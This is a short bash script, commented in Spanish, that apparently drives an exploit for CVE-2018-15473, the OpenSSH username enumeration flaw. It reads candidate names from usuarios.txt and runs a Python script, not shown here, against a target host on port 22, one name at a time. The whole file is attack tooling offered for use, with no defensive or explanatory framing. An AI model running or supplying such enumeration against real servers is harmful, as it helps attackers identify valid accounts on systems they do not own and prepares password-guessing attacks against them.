#!/bin/bash
# Explotar vulnerabilidad 2018-15473 OpenSSH 2.3 < 7.7 Username Enumeration

for i in `cat usuarios.txt`
do
        echo $i
        python usuariossh.py $1 --port 22 $i
done
